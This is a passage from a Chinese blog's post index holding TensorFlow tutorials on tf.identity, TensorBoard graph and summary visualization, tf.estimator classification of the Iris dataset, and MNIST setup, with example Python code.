其实这里的tf.identity的作用相当于一个reference，也就是y仅仅是一个x的别名，这两个变量使用的是一块内存，而对于y=x，x与y在不同的内存中。 这里举一个经典的例子 12345678910111213141516171819202122#include &lt;iostream&gt;void swap1(int a,int b) &#123; a^=b; b^=a; a^=b; &#125; void swap2(int &amp;a,int &amp;b) &#123; a^=b; b^=a; a^=b; &#125; int main()&#123; int a=1,b=2; std::cout &lt;&lt; a &lt;&lt; b &lt;&lt; endl;//12 swap1(a, b); std::cout &lt;&lt; a &lt;&lt; b &lt;&lt; endl;//12 swap2(a, b); std::cout &lt;&lt; a &lt;&lt; b &lt;&lt; endl;//21&#125; 当然这是我的理解，可能有不对之处，欢迎大家指出！","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://coordinate.wang/categories/机器学习/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"tensorflow","slug":"tensorflow","permalink":"http://coordinate.wang/tags/tensorflow/"},{"name":"identity","slug":"identity","permalink":"http://coordinate.wang/tags/identity/"}]},{"title":"TensorBoard计算图可视化","slug":"2017-12-06-TensorBoard图形可视化","date":"2017-12-05T16:00:00.000Z","updated":"2018-02-18T08:37:40.782Z","comments":true,"path":"2017/12/06/2017-12-06-TensorBoard图形可视化/","link":"","permalink":"http://coordinate.wang/2017/12/06/2017-12-06-TensorBoard图形可视化/","excerpt":"TensorFlow计算图功能强大但复杂。 图表可视化可以帮助您理解和调试它们。 这是一个可视化工作的例子。 命名空间和节点典型的TensorFlow图可能有成千上万个节点 - 太多的节点很难一次看到，甚至无法使用标准的图形工具进行布局。 为简化起见，变量名声明在作用域内，可视化使用这些信息来定义图中节点上的层次结构。 默认情况下，只显示该层次结构的顶部。 下面是一个使用tf.name_scope在hidden名称范围下定义三个操作的示例： 123456import tensorflow as tfwith tf.name_scope('hidden') as scope: a = tf.constant(5, name='alpha') W = tf.Variable(tf.random_uniform([1, 2], -1.0, 1.0), name='weights') b = tf.Variable(tf.zeros([1]), name='biases')","text":"TensorFlow计算图功能强大但复杂。 图表可视化可以帮助您理解和调试它们。 这是一个可视化工作的例子。 命名空间和节点典型的TensorFlow图可能有成千上万个节点 - 太多的节点很难一次看到，甚至无法使用标准的图形工具进行布局。 为简化起见，变量名声明在作用域内，可视化使用这些信息来定义图中节点上的层次结构。 默认情况下，只显示该层次结构的顶部。 下面是一个使用tf.name_scope在hidden名称范围下定义三个操作的示例： 123456import tensorflow as tfwith tf.name_scope('hidden') as scope: a = tf.constant(5, name='alpha') W = tf.Variable(tf.random_uniform([1, 2], -1.0, 1.0), name='weights') b = tf.Variable(tf.zeros([1]), name='biases') 这产生了以下三个操作名称： hidden/alpha hidden/weights hidden/biases 默认情况下，可视化文件将全部折叠为标记为隐藏的节点。 额外的细节不会丢失。 你可以双击，或者点击右上角的橙色+符号来展开节点，然后你会看到三个子节点，分别是alpha，weight和bias。 这是一个复杂节点在其初始状态和扩展状态的例子。 按命名空间对节点进行分组对于制作清晰的图形至关重要。如果您正在构建模型，则命名空间可以控制生成的可视化图像。你的命名空间越好，你的可视化就越好。 上图说明了可视化的第二个方面。 TensorFlow图有两种连接：数据相关性和控制相关性。数据相关性显示两个操作符之间的张量流，并用实线箭头显示，而控制相关性使用虚线。在扩展视图（上图右侧）中，除了连接CheckNumerics和control_dependency的虚线外，所有连接都是数据依赖关系。 还有一个简化布局的技巧。大多数TensorFlow图有几个与其他节点连接的节点。例如，许多节点可能对初始化步骤具有控制依赖性。绘制init节点及其依赖关系之间的所有边将创建一个非常混乱的视图。 为了减少混乱，可视化将所有高度节点分隔到右侧的辅助区域，并不画线来表示其边缘。我们绘制小节点图标来代替连线。分离出的辅助节点通常不会去除关键信息，因为这些节点通常与簿记功能相关。有关如何在主图形和辅助区域之间移动节点的信息，请参阅交互。 最后一个结构简化是series collapsing连续图案 - 也就是说，名称相差最后一个数字并具有同构结构的节点 - 会折叠成一堆节点，如下所示。 对于长序列的网络，这大大简化了视图。 与分层节点一样，双击将扩展该系列。 请参阅交互以了解如何为特定节点集禁用/启用系列折叠。 最后，作为易读性的最后一个帮助，可视化对常量和汇总节点使用特殊的图标。 总结为下面的节点符号表： 交互通过平移和缩放导航图形。 点击并拖动以平移，并使用滚动手势进行缩放。 双击某个节点，或单击其+按钮，展开一个代表一组操作的命名空间。 为了在放大和平移时轻松跟踪当前视点，右下角会有一个小地图。 要关闭打开的节点，请再次双击它或单击其-按钮。 您也可以单击一次以选择一个节点， 它会变成一个较深的颜色，并且关于它的详细信息以及它所连接的节点将出现在右上角的可视化对象信息卡中。 TensorBoard提供了几种方法来改变图形的视觉布局。这不会改变图的计算语义，但是它可以使网络的结构变得清晰。通过右键单击某个节点或按该节点信息卡底部的按钮，可以对其布局进行以下更改： 节点可以在主图表和辅助区域之间移动。 可以将一系列节点取消分组，使得该系列中的节点不会出现在一起。未分组的序列也可以重新组合。 Selection也可以帮助理解高层次节点。选择任何高层次节点，其他连接的相应节点图标也将被选中。这可以很容易地看到哪些节点正在保存 - 哪些不是。 点击信息卡中的节点名称将选择它。如有必要，视点将自动平移，以便节点可见。 最后，您可以使用图例上方的颜色菜单为图形选择两种配色方案。默认的显示结构：当两个高层节点具有相同的结构时，它们以相同颜色出现。结构独特的节点是灰色的。第二个视图，它显示了不同操作运行的设备。名称范围与其内部操作的设备成比例。 下面的图片给出了例子。 张量形状信息当序列化的GraphDef包含张量形状时，图形可视化器将张量标注为边缘，边缘厚度反映总张量大小。 要在GraphDef中包含张量形状，在序列化图形时将实际图形对象（如sess.graph）传递给FileWriter。 下面的图片显示了具有张量形状信息的CIFAR-10模型： 运行时统计收集运行时元数据通常是非常有用的，例如总内存使用量，总计算时间和节点的张量形状。 下面的代码示例是简单的MNIST教程的修改的训练和测试部分的一个片段，其中我们记录了摘要和运行时统计信息。 有关如何记录摘要的详细信息，请参阅摘要教程。 完整的源代码在这里。 123456789101112131415161718192021222324252627282930313233# Train the model, and also write summaries. # Every 10th step, measure test-set accuracy, and write test summaries # All other steps, run train_step on training data, &amp; add training summaries def feed_dict(train): \"\"\"Make a TensorFlow feed_dict: maps data onto Tensor placeholders.\"\"\" if train or FLAGS.fake_data: xs, ys = mnist.train.next_batch(100, fake_data=FLAGS.fake_data) k = FLAGS.dropout else: xs, ys = mnist.test.images, mnist.test.labels k = 1.0 return &#123;x: xs, y_: ys, keep_prob: k&#125; for i in range(FLAGS.max_steps): if i % 10 == 0: # Record summaries and test-set accuracy summary, acc = sess.run([merged, accuracy], feed_dict=feed_dict(False)) test_writer.add_summary(summary, i) print('Accuracy at step %s: %s' % (i, acc)) else: # Record train set summaries, and train if i % 100 == 99: # Record execution stats run_options = tf.RunOptions(trace_level=tf.RunOptions.FULL_TRACE) run_metadata = tf.RunMetadata() summary, _ = sess.run([merged, train_step], feed_dict=feed_dict(True), options=run_options, run_metadata=run_metadata) train_writer.add_run_metadata(run_metadata, 'step%d' % i) train_writer.add_summary(summary, i) print('Adding run metadata for', i) else: # Record a summary summary, _ = sess.run([merged, train_step], feed_dict=feed_dict(True)) train_writer.add_summary(summary, i) 此代码将从步骤99开始每100步发出运行时统计信息。 当启动tensorboard并转到图表选项卡时，您将在“会话运行”下看到与添加运行元数据的步骤相对应的选项。 选择其中一个运行将显示在该步骤的网络快照，淡出未使用的节点。 在左侧的控件中，您可以通过总内存或总计算时间对节点着色。 此外，单击节点将显示确切的总内存，计算时间和张量输出大小。","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://coordinate.wang/categories/机器学习/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"tensorflow","slug":"tensorflow","permalink":"http://coordinate.wang/tags/tensorflow/"},{"name":"estimator","slug":"estimator","permalink":"http://coordinate.wang/tags/estimator/"}]},{"title":"TensorBoard可视化学习","slug":"2017-12-05-TensorBoard可视化学习","date":"2017-12-04T16:00:00.000Z","updated":"2018-02-18T08:37:54.052Z","comments":true,"path":"2017/12/05/2017-12-05-TensorBoard可视化学习/","link":"","permalink":"http://coordinate.wang/2017/12/05/2017-12-05-TensorBoard可视化学习/","excerpt":"您将使用TensorFlow进行的计算 - 如训练大量的深度神经网络 - 可能会很复杂且令人困惑。 为了便于理解，调试和优化TensorFlow程序，我们包含了一套名为TensorBoard的可视化工具。 您可以使用TensorBoard来显示您的TensorFlow图形，绘制关于图形执行的量化指标，并显示其他数据，如图像。 当完全配置TensorBoard时，看起来像这样： 序列化数据TensorBoard通过读取TensorFlow事件文件进行操作，TensorFlow事件文件包含运行TensorFlow时可以生成的摘要数据。以下是TensorBoard中汇总数据的一般生命周期。 首先，创建您希望从中收集摘要数据的TensorFlow图，然后决定使用摘要操作注解哪些节点。 例如，假设您正在训练用于识别MNIST数字的卷积神经网络。您想记录学习率随时间的变化，以及目标函数如何变化。通过将tf.summary.scalar 操作分别附加到输出学习率和损失来收集这些信息。然后，给每个标量附上有意义的标签，如“学习率”或“损失函数”。 也许你也想看到特定层的激活分布，或梯度或权重的分布。通过将tf.summary.histogram操作附加到梯度输出和保存您权重的变量来收集这些数据。 有关所有可用摘要操作的详细信息，请查看有关摘要操作的文档。","text":"您将使用TensorFlow进行的计算 - 如训练大量的深度神经网络 - 可能会很复杂且令人困惑。 为了便于理解，调试和优化TensorFlow程序，我们包含了一套名为TensorBoard的可视化工具。 您可以使用TensorBoard来显示您的TensorFlow图形，绘制关于图形执行的量化指标，并显示其他数据，如图像。 当完全配置TensorBoard时，看起来像这样： 序列化数据TensorBoard通过读取TensorFlow事件文件进行操作，TensorFlow事件文件包含运行TensorFlow时可以生成的摘要数据。以下是TensorBoard中汇总数据的一般生命周期。 首先，创建您希望从中收集摘要数据的TensorFlow图，然后决定使用摘要操作注解哪些节点。 例如，假设您正在训练用于识别MNIST数字的卷积神经网络。您想记录学习率随时间的变化，以及目标函数如何变化。通过将tf.summary.scalar 操作分别附加到输出学习率和损失来收集这些信息。然后，给每个标量附上有意义的标签，如“学习率”或“损失函数”。 也许你也想看到特定层的激活分布，或梯度或权重的分布。通过将tf.summary.histogram操作附加到梯度输出和保存您权重的变量来收集这些数据。 有关所有可用摘要操作的详细信息，请查看有关摘要操作的文档。 在运行之前，TensorFlow中不会执行任何操作，或者取决于其输出的操作。我们刚刚创建的摘要节点是图形的外围设备：您当前正在运行的操作都不依赖于它们。所以，为了生成摘要，我们需要运行所有这些汇总节点。手工管理它们会很麻烦，所以使用tf.summary.merge_all将它们组合成一个单独的操作来生成所有的汇总数据。 然后，您可以运行合并的摘要操作，该操作将在给定的步骤中生成包含所有摘要数据的序列化的protobuf对象。最后，为了将这个总结数据写入磁盘，将总结的protobuf传递给tf.summary.FileWriter。 FileWriter在其构造函数中使用了一个logdir - 这个logdir非常重要，它是所有事件将被写出的目录。另外，FileWriter可以选择在其构造函数中使用Graph。如果它接收到一个Graph对象，那么TensorBoard会将您的图形与张量形状信息一起可视化。这将使您更好地理解图中流动的情况：请参阅张量形状信息。 现在你已经修改了你的图形，并有一个FileWriter，你已经准备好开始运行你的网络！如果你愿意，你可以每一步都运行合并的摘要操作，并记录大量的训练数据，虽然这可能产生更多的数据。所以请考虑每n步运行合并的摘要操作。 下面的代码示例是对简单MNIST教程的修改，我们在其中添加了一些汇总操作，并且每十步执行一次。如果你运行这个程序，然后启动tensorboard --logdir = /tmp/tensorflow/mnist，你将可以看到统计数据，例如训练过程中权重或精度的变化。下面的代码是摘录，完整的源代码在这里。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778def variable_summaries(var): \"\"\"Attach a lot of summaries to a Tensor (for TensorBoard visualization).\"\"\" with tf.name_scope('summaries'): mean = tf.reduce_mean(var) tf.summary.scalar('mean', mean) with tf.name_scope('stddev'): stddev = tf.sqrt(tf.reduce_mean(tf.square(var - mean))) tf.summary.scalar('stddev', stddev) tf.summary.scalar('max', tf.reduce_max(var)) tf.summary.scalar('min', tf.reduce_min(var)) tf.summary.histogram('histogram', var)def nn_layer(input_tensor, input_dim, output_dim, layer_name, act=tf.nn.relu): \"\"\"Reusable code for making a simple neural net layer. It does a matrix multiply, bias add, and then uses relu to nonlinearize. It also sets up name scoping so that the resultant graph is easy to read, and adds a number of summary ops. \"\"\" # Adding a name scope ensures logical grouping of the layers in the graph. with tf.name_scope(layer_name): # This Variable will hold the state of the weights for the layer with tf.name_scope('weights'): weights = weight_variable([input_dim, output_dim]) variable_summaries(weights) with tf.name_scope('biases'): biases = bias_variable([output_dim]) variable_summaries(biases) with tf.name_scope('Wx_plus_b'): preactivate = tf.matmul(input_tensor, weights) + biases tf.summary.histogram('pre_activations', preactivate) activations = act(preactivate, name='activation') tf.summary.histogram('activations', activations) return activationshidden1 = nn_layer(x, 784, 500, 'layer1')with tf.name_scope('dropout'): keep_prob = tf.placeholder(tf.float32) tf.summary.scalar('dropout_keep_probability', keep_prob) dropped = tf.nn.dropout(hidden1, keep_prob)# Do not apply softmax activation yet, see below.y = nn_layer(dropped, 500, 10, 'layer2', act=tf.identity)with tf.name_scope('cross_entropy'): # The raw formulation of cross-entropy, # # tf.reduce_mean(-tf.reduce_sum(y_ * tf.log(tf.softmax(y)), # reduction_indices=[1])) # # can be numerically unstable. # # So here we use tf.nn.softmax_cross_entropy_with_logits on the # raw outputs of the nn_layer above, and then average across # the batch. diff = tf.nn.softmax_cross_entropy_with_logits(targets=y_, logits=y) with tf.name_scope('total'): cross_entropy = tf.reduce_mean(diff)tf.summary.scalar('cross_entropy', cross_entropy)with tf.name_scope('train'): train_step = tf.train.AdamOptimizer(FLAGS.learning_rate).minimize( cross_entropy)with tf.name_scope('accuracy'): with tf.name_scope('correct_prediction'): correct_prediction = tf.equal(tf.argmax(y, 1), tf.argmax(y_, 1)) with tf.name_scope('accuracy'): accuracy = tf.reduce_mean(tf.cast(correct_prediction, tf.float32))tf.summary.scalar('accuracy', accuracy)# Merge all the summaries and write them out to /tmp/mnist_logs (by default)merged = tf.summary.merge_all()train_writer = tf.summary.FileWriter(FLAGS.summaries_dir + '/train', sess.graph)test_writer = tf.summary.FileWriter(FLAGS.summaries_dir + '/test')tf.global_variables_initializer().run() 在初始化FileWriters之后，我们必须在我们训练和测试模型时将摘要添加到FileWriters。 12345678910111213141516171819202122# Train the model, and also write summaries.# Every 10th step, measure test-set accuracy, and write test summaries# All other steps, run train_step on training data, &amp; add training summariesdef feed_dict(train): \"\"\"Make a TensorFlow feed_dict: maps data onto Tensor placeholders.\"\"\" if train or FLAGS.fake_data: xs, ys = mnist.train.next_batch(100, fake_data=FLAGS.fake_data) k = FLAGS.dropout else: xs, ys = mnist.test.images, mnist.test.labels k = 1.0 return &#123;x: xs, y_: ys, keep_prob: k&#125;for i in range(FLAGS.max_steps): if i % 10 == 0: # Record summaries and test-set accuracy summary, acc = sess.run([merged, accuracy], feed_dict=feed_dict(False)) test_writer.add_summary(summary, i) print('Accuracy at step %s: %s' % (i, acc)) else: # Record train set summaries, and train summary, _ = sess.run([merged, train_step], feed_dict=feed_dict(True)) train_writer.add_summary(summary, i) 您现在已经可以使用TensorBoard将这些数据可视化了。 启动TensorBoard要运行TensorBoard，请使用以下命令（或者使用python -m tensorboard.main） 1tensorboard --logdir=path/to/log-directory 其中logdir指向FileWriter序列化其数据的目录。 如果此logdir目录包含来自单独运行的序列化数据的子目录，则TensorBoard将可视化来自所有这些运行的数据。 一旦TensorBoard正在运行，浏览您的Web浏览器到localhost:6006以查看TensorBoard。 在看TensorBoard时，您会看到右上角的导航标签。 每个选项卡代表一组可以可视化的序列化数据。","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://coordinate.wang/categories/机器学习/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"tensorflow","slug":"tensorflow","permalink":"http://coordinate.wang/tags/tensorflow/"},{"name":"estimator","slug":"estimator","permalink":"http://coordinate.wang/tags/estimator/"}]},{"title":"tf.estimator 快速上手","slug":"2017-12-04-tf.estimator-快速上手","date":"2017-12-03T16:00:00.000Z","updated":"2018-02-18T08:38:05.616Z","comments":true,"path":"2017/12/04/2017-12-04-tf.estimator-快速上手/","link":"","permalink":"http://coordinate.wang/2017/12/04/2017-12-04-tf.estimator-快速上手/","excerpt":"TensorFlow的高级机器学习API（tf.estimator）可以轻松配置，训练和评估各种机器学习模型。 在本教程中，您将使用tf.estimator构建一个神经网络分类器，并在Iris数据集上对其进行训练，以基于萼片/花瓣几何学来预测花朵种类。 您将编写代码来执行以下五个步骤： 将包含Iris训练/测试数据的CSV加载到TensorFlow数据集中 构建一个神经网络分类器 使用训练数据训练模型 评估模型的准确性 分类新样品 注：在开始本教程之前，请记住在您的机器上安装TensorFlow。 完整的神经网络源代码","text":"TensorFlow的高级机器学习API（tf.estimator）可以轻松配置，训练和评估各种机器学习模型。 在本教程中，您将使用tf.estimator构建一个神经网络分类器，并在Iris数据集上对其进行训练，以基于萼片/花瓣几何学来预测花朵种类。 您将编写代码来执行以下五个步骤： 将包含Iris训练/测试数据的CSV加载到TensorFlow数据集中 构建一个神经网络分类器 使用训练数据训练模型 评估模型的准确性 分类新样品 注：在开始本教程之前，请记住在您的机器上安装TensorFlow。 完整的神经网络源代码 以下是神经网络分类器的完整代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687from __future__ import absolute_importfrom __future__ import divisionfrom __future__ import print_functionimport osfrom six.moves.urllib.request import urlopenimport numpy as npimport tensorflow as tf# Data setsIRIS_TRAINING = \"iris_training.csv\"IRIS_TRAINING_URL = \"http://download.tensorflow.org/data/iris_training.csv\"IRIS_TEST = \"iris_test.csv\"IRIS_TEST_URL = \"http://download.tensorflow.org/data/iris_test.csv\"def main(): # If the training and test sets aren't stored locally, download them. if not os.path.exists(IRIS_TRAINING): raw = urlopen(IRIS_TRAINING_URL).read() with open(IRIS_TRAINING, \"wb\") as f: f.write(raw) if not os.path.exists(IRIS_TEST): raw = urlopen(IRIS_TEST_URL).read() with open(IRIS_TEST, \"wb\") as f: f.write(raw) # Load datasets. training_set = tf.contrib.learn.datasets.base.load_csv_with_header( filename=IRIS_TRAINING, target_dtype=np.int, features_dtype=np.float32) test_set = tf.contrib.learn.datasets.base.load_csv_with_header( filename=IRIS_TEST, target_dtype=np.int, features_dtype=np.float32) # Specify that all features have real-value data feature_columns = [tf.feature_column.numeric_column(\"x\", shape=[4])] # Build 3 layer DNN with 10, 20, 10 units respectively. classifier = tf.estimator.DNNClassifier(feature_columns=feature_columns, hidden_units=[10, 20, 10], n_classes=3, model_dir=\"/tmp/iris_model\") # Define the training inputs train_input_fn = tf.estimator.inputs.numpy_input_fn( x=&#123;\"x\": np.array(training_set.data)&#125;, y=np.array(training_set.target), num_epochs=None, shuffle=True) # Train model. classifier.train(input_fn=train_input_fn, steps=2000) # Define the test inputs test_input_fn = tf.estimator.inputs.numpy_input_fn( x=&#123;\"x\": np.array(test_set.data)&#125;, y=np.array(test_set.target), num_epochs=1, shuffle=False) # Evaluate accuracy. accuracy_score = classifier.evaluate(input_fn=test_input_fn)[\"accuracy\"] print(\"\\nTest Accuracy: &#123;0:f&#125;\\n\".format(accuracy_score)) # Classify two new flower samples. new_samples = np.array( [[6.4, 3.2, 4.5, 1.5], [5.8, 3.1, 5.0, 1.7]], dtype=np.float32) predict_input_fn = tf.estimator.inputs.numpy_input_fn( x=&#123;\"x\": new_samples&#125;, num_epochs=1, shuffle=False) predictions = list(classifier.predict(input_fn=predict_input_fn)) predicted_classes = [p[\"classes\"] for p in predictions] print( \"New Samples, Class Predictions: &#123;&#125;\\n\" .format(predicted_classes))if __name__ == \"__main__\": main() 以下部分详细介绍了代码。 将Iris CSV数据加载到TensorFlowIris数据集包含150行数据，包括来自三个相关鸢尾属物种中的每一个的50个样品：Iris setosa，Iris virginica和Iris versicolor。 From left to right, Iris setosa (by Radomil, CC BY-SA 3.0), Iris versicolor (by Dlanglois, CC BY-SA 3.0), and Iris virginica(by Frank Mayfield, CC BY-SA 2.0). 每行包含每个花样的以下数据：萼片长度，萼片宽度，花瓣长度，花瓣宽度和花种。 花种以整数表示，其中0表示Iris setosa，1表示Iris virginica，2表示Iris versicolor。 对于本教程，Iris数据已被随机分成两个独立的CSV： 120个样本的训练集（iris_training.csv） 30个样本的测试集（iris_test.csv）。 开始前，首先导入所有必要的模块，并定义下载和存储数据集的位置： 123456789101112131415from __future__ import absolute_importfrom __future__ import divisionfrom __future__ import print_functionimport osfrom six.moves.urllib.request import urlopenimport tensorflow as tfimport numpy as npIRIS_TRAINING = \"iris_training.csv\"IRIS_TRAINING_URL = \"http://download.tensorflow.org/data/iris_training.csv\"IRIS_TEST = \"iris_test.csv\"IRIS_TEST_URL = \"http://download.tensorflow.org/data/iris_test.csv\" 然后，如果训练和测试集尚未存储在本地，请下载它们。 123456789if not os.path.exists(IRIS_TRAINING): raw = urlopen(IRIS_TRAINING_URL).read() with open(IRIS_TRAINING,'wb') as f: f.write(raw)if not os.path.exists(IRIS_TEST): raw = urlopen(IRIS_TEST_URL).read() with open(IRIS_TEST,'wb') as f: f.write(raw) 接下来，使用learn.datasets.base中的load_csv_with_header()方法将训练集和测试集加载到数据集中。 load_csv_with_header()方法需要三个必需的参数： filename，它将文件路径转换为CSV文件 target_dtype，它采用数据集的目标值的numpy数据类型。 features_dtype，它采用数据集特征值的numpy数据类型。 在这里，目标（你正在训练模型来预测的值）是花的种类，它是一个从0到2的整数，所以合适的numpy数据类型是np.int： 123456789# Load datasets.training_set = tf.contrib.learn.datasets.base.load_csv_with_header( filename=IRIS_TRAINING, target_dtype=np.int, features_dtype=np.float32)test_set = tf.contrib.learn.datasets.base.load_csv_with_header( filename=IRIS_TEST, target_dtype=np.int, features_dtype=np.float32) tf.contrib.learn中的数据集被命名为元组;您可以通过data和target字段访问特征数据和目标值。这里，training_set.data和training_set.target分别包含训练集的特征数据和目标值，test_set.data和test_set.target包含测试集的特征数据和目标值。 稍后，在“将DNNClassifier安装到Iris训练数据”中，您将使用training_set.data和training_set.target来训练您的模型，在“Evaluate Model Accuracy”中，您将使用test_set.data和test_set.target。但首先，您将在下一节中构建您的模型。 构建深度神经网络分类器tf.estimator提供了各种预定义的模型，称为Estimators，您可以使用“开箱即用”对数据进行训练和评估操作。在这里，您将配置深度神经网络分类器模型以适应Iris数据。使用tf.estimator，你可以用几行代码实例化你的tf.estimator.DNNClassifier： 12345678# Specify that all features have real-value datafeature_columns = [tf.feature_column.numeric_column(\"x\", shape=[4])]# Build 3 layer DNN with 10, 20, 10 units respectively.classifier = tf.estimator.DNNClassifier(feature_columns=feature_columns, hidden_units=[10, 20, 10], n_classes=3, model_dir=\"/tmp/iris_model\") 上面的代码首先定义模型的特征列，它指定数据集中特征的数据类型。所有的特征数据都是连续的，所以tf.feature_column.numeric_column是用来构造特征列的适当函数。数据集中有四个特征（萼片宽度，萼片高度，花瓣宽度和花瓣高度），所以相应的形状必须设置为[4]来保存所有的数据。 然后，代码使用以下参数创建一个DNNClassifier模型： feature_columns = feature_columns。上面定义的一组特征列。 hidden_units = [10，20，10]。三个隐藏层，分别包含10,20和10个神经元。 n_classes = 3。三个目标类，代表三个鸢尾属。 model_dir =/tmp/iris_model。 TensorFlow将在模型训练期间保存检查点数据和TensorBoard摘要的目录。 描述训练输入管道tf.estimator API使用输入函数，这些输入函数创建了用于为模型生成数据的TensorFlow操作。我们可以使用tf.estimator.inputs.numpy_input_fn来产生输入管道： 123456# Define the training inputstrain_input_fn = tf.estimator.inputs.numpy_input_fn( x=&#123;\"x\": np.array(training_set.data)&#125;, y=np.array(training_set.target), num_epochs=None, shuffle=True) 将DNNClassifier安装到Iris训练数据 现在，您已经配置了DNN分类器模型，可以使用train方法将其适用于Iris训练数据。 将train_input_fn传递给input_fn，以及要训练的步数（这里是2000）： 12# Train model.classifier.train(input_fn=train_input_fn, steps=2000) 模型的状态保存在分类器中，这意味着如果你喜欢，可以迭代地训练。 例如，上面的做法相当于以下内容： 12classifier.train(input_fn=train_input_fn, steps=1000)classifier.train(input_fn=train_input_fn, steps=1000) 但是，如果您希望在训练时跟踪模型，则可能需要使用TensorFlow SessionRunHook来执行日志记录操作。 评估模型的准确性您已经在Iris训练数据上训练了您的DNNClassifier模型; 现在，您可以使用评估方法检查Iris测试数据的准确性。 像train一样，evaluate需要一个输入函数来建立它的输入流水线。 评估返回与评估结果的字典。 以下代码将通过Iris测试data-test_set.data和test_set.target来评估和打印结果的准确性： 1234567891011# Define the test inputstest_input_fn = tf.estimator.inputs.numpy_input_fn( x=&#123;\"x\": np.array(test_set.data)&#125;, y=np.array(test_set.target), num_epochs=1, shuffle=False)# Evaluate accuracy.accuracy_score = classifier.evaluate(input_fn=test_input_fn)[\"accuracy\"]print(\"\\nTest Accuracy: &#123;0:f&#125;\\n\".format(accuracy_score)) 注意：这里numpy_input_fn的num_epochs = 1参数很重要。 test_input_fn将迭代数据一次，然后引发OutOfRangeError。 这个错误表示分类器停止评估，所以它会在输入上评估一次。 当你运行完整的脚本时，它会打印出一些接近的内容： 1Test Accuracy: 0.966667 您的准确性结果可能会有所不同，但应该高于90％。 对于相对较小的数据集来说很不错了！ 分类新样品使用估计器的predict()方法对新样本进行分类。 例如，假设你有这两个新的花样： 您可以使用predict()方法预测它们的物种。 预测返回一个字符串生成器，可以很容易地转换为列表。 以下代码检索并打印类预测： 123456789101112131415# Classify two new flower samples.new_samples = np.array( [[6.4, 3.2, 4.5, 1.5], [5.8, 3.1, 5.0, 1.7]], dtype=np.float32)predict_input_fn = tf.estimator.inputs.numpy_input_fn( x=&#123;\"x\": new_samples&#125;, num_epochs=1, shuffle=False)predictions = list(classifier.predict(input_fn=predict_input_fn))predicted_classes = [p[\"classes\"] for p in predictions]print( \"New Samples, Class Predictions: &#123;&#125;\\n\" .format(predicted_classes)) 你的结果应该如下所示： 1New Samples, Class Predictions: [1 2] 因此，模型预测第一个样品是Iris versicolor，第二个样品是Iris virginica。","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://coordinate.wang/categories/机器学习/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"tensorflow","slug":"tensorflow","permalink":"http://coordinate.wang/tags/tensorflow/"},{"name":"estimator","slug":"estimator","permalink":"http://coordinate.wang/tags/estimator/"}]},{"title":"深入研究MNIST","slug":"2017-12-03-深入研究MNIST","date":"2017-12-02T16:00:00.000Z","updated":"2018-02-18T08:38:31.599Z","comments":true,"path":"2017/12/03/2017-12-03-深入研究MNIST/","link":"","permalink":"http://coordinate.wang/2017/12/03/2017-12-03-深入研究MNIST/","excerpt":"加载MNIST数据如果您正在复制和粘贴本教程的代码，请从这里开始，下面这两行代码将自动下载并读取数据： 12from tensorflow.examples.tutorials.mnist import input_datamnist = input_data.read_data_sets('MNIST_data', one_hot=True) 这里mnist是一个轻量级数据集，它将训练、验证和测试集存储为NumPy数组。 它还提供了一个函数来迭代数据minibatches，我们将在下面使用。","text":"加载MNIST数据如果您正在复制和粘贴本教程的代码，请从这里开始，下面这两行代码将自动下载并读取数据： 12from tensorflow.examples.tutorials.mnist import input_datamnist = input_data.read_data_sets('MNIST_data', one_hot=True) 这里mnist是一个轻量级数据集，它将训练、验证和测试集存储为NumPy数组。 它还提供了一个函数来迭代数据minibatches，我们将在下面使用。 启动TensorFlow InteractiveSessionTensorFlow依靠高效的C ++后端来完成它的计算。 与此后端的连接称为会话。 TensorFlow程序的常见用法是首先创建一个图形，然后在会话中启动它。 在这里，我们使用便利的InteractiveSession类，这使得TensorFlow更加灵活地了解如何构建代码。 它允许您将构建计算图的操作与运行图的操作交错。 在IPython等交互式环境中工作时，这特别方便。 如果您没有使用InteractiveSession，则应在开始会话并启动图之前构建整个计算图。 12import tensorflow as tfsess = tf.InteractiveSession() 计算图为了在Python中进行有效的数值计算，我们通常使用像NumPy这样的库来执行复杂的操作，例如Python之外的矩阵乘法，使用另一种语言实现的高效代码来完成这些操作。不幸的是，每一次操作都会返回到Python，这仍然会有很多开销。如果要在GPU上运行计算或以分布式方式运行计算，则传输数据的成本很高，所以此开销尤其糟糕。 TensorFlow也在Python之外进行繁重的工作，但是为了避免这种开销，还需要进一步的工作。 TensorFlow不是独立于Python运行的一个复杂操作，而是让我们描述一个完全在Python之外运行的交互操作图。 （像这样的方法可以在几个机器学习库中看到） 因此，Python代码的作用是构建这个外部计算图，并指定运行图的每个部分。 #建立一个Softmax回归模型 在本节中，我们将建立一个单线性层的softmax回归模型。在下一节中，我们将扩展到具有多层卷积网络的softmax回归的情况。 占位符我们通过为输入图像和目标输出类创建节点来开始构建计算图。 12x = tf.placeholder(tf.float32, shape=[None, 784])y_ = tf.placeholder(tf.float32, shape=[None, 10]) 这里x和y_不是特定的值。相反，它们都是占位符 - 当我们要求TensorFlow运行一个计算时，我们会输入一个值。 输入图像x将由浮点数的二维张量组成。这里我们给它赋予一个[None，784]的形状，其中784是一个单一的28×28像素MNIST图像的维度，None表示与batch大小相对应的第一维度可以是任意大小。目标输出类别y_也将由二维张量组成，其中每一行是一个唯一的10维向量，指示对应的MNIST图像是哪个数字（0到9）。 占位符的形状参数是可选的，但它允许TensorFlow自动捕捉源自不一致张量形状的错误。 变量我们现在定义权重W，并为我们的模型赋予偏差b。我们可以把这些看作是额外的输入，但是TensorFlow有一个更好的方法来处理它们：Variable（变量）。变量是存在于TensorFlow的计算图中的一个值。它可以被使用，甚至被计算修改。在机器学习应用中，通常将模型参数设置为变量。 12W = tf.Variable(tf.zeros([784,10]))b = tf.Variable(tf.zeros([10])) 我们将调用中的每个参数的初始值传递给tf.Variable。 在这种情况下，我们将W和b初始化为全0的张量。 